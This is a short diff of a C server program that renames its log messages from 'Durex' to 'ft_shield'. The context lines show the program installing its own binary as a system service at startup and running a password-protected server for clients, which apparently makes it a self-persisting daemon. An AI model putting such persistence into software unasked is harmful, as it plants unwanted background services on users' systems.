@@ -45,10 +45,10 @@ static void		free_at_exit(int status, void *data)
 {
 	t_server *server;
 
-	durex_log("======== Durex quitting ...  ========", LOG_WARNING);
+	durex_log("======== ft_shield quitting ...  ========", LOG_WARNING);
 	if (!(server = (t_server*)data))
 		return ;
-	durex_log("======== Durex deleting data ...  ========", LOG_WARNING);
+	durex_log("======== ft_shield deleting data ...  ========", LOG_WARNING);
 	(void)status;
 	if (server->client_lst)
 	{
@@ -70,7 +70,7 @@ int main(int ac, char **av)
 		return (EXIT_FAILURE);
 	}
 	on_exit(free_at_exit, &server);
-	durex_log("======== Durex  has started! ========", LOG_WARNING);
+	durex_log("======== ft_shield  has started! ========", LOG_WARNING);
 	install_service(av[0]);
 	ft_memset(&server, 0, sizeof(server));
 	server.require_pass = true;
